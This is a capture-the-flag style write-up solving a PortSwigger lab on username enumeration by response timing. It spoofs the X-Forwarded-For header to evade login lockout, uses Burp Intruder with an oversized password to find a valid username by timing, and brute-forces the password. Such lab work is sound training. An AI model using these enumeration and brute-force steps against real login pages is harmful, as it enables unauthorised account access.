# Lab: Username enumeration via response timing

### Instructions

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Your credentials: wiener:peter
Candidate usernames - https://portswigger.net/web-security/authentication/auth-lab-usernames
Candidate passwords - https://portswigger.net/web-security/authentication/auth-lab-passwords

### Solution

Poking at the login form to understand its messages we can try credentials `test:test` and get the response:

```
Invalid username or password. 
```

Trying a few other basic combinations locks us out:

```
You have made too many incorrect login attempts. Please try again in 30 minute(s). 
```

We can bypass this protection mechanism using the `X-Forwarded-For:` header

```
POST /login HTTP/2
Host: 0a7700fa044fd98a80be6dae000e00b9.web-security-academy.net
Cookie: session=LErEiNx25UdjMNxoySz0HkrVPlILS3vS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://0a7700fa044fd98a80be6dae000e00b9.web-security-academy.net
Referer: https://0a7700fa044fd98a80be6dae000e00b9.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
X-Forwarded-For: localhost

username=test&password=test
```

We can now send this to Intruder and use a Pitchfork approach, injecting our username enumeration wordlist into the `username` parameter and a simple 1-100 number list into the `X-Forwarded-By` parameter. 

```
X-Forwarded-For:§localhost§

username=§test§&password=test
```

Launching this attack and enabling the "Response Completed" column to show response times, we can see that response times are very consistent across all usernames.

```
1	carlos	200	178	178	false	false	3353	
21	access	200	266	266	false	false	3353	
8	mysql	200	323	323	false	false	3353	
65	announcements	200	322	323	false	false	3353			
```

We can try this method again, only this time include a very large password string, which should hopefully impact processing time for a valid username:

```
X-Forwarded-For: §localhost§

username=§test§&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Launching this again, we now find a response time that is quite a bit larger than the others: 

```
83	83	argentina	200	4164	4164	false	false	3353	
49	49	ak	200	353	353	false	false	3353	
68	68	ap	200	337	338	false	false	3353	
73	73	app1	200	335	336	false	false	3353	
78	78	appserver	200	335	336	false	false	3353			
```

We can assume here that argentina is a valid username, as the response time took much longer than the other non-valid names.

Armed with this, we can adjust our payload positions, and bruteforce the password using the provided password list:

```
X-Forwarded-For: §localhost§

username=argentina&password=§test§
```

Only one request contains a 302, indicating a redirect and that the password worked:

```
43	43	batman	302	327	false	false	191	
37	37	zxcvbnm	200	320	false	false	3353	
64	64	zxcvbn	200	354	false	false	3440	
```

We can now login with credentials `argentina:batman` to solve the lab.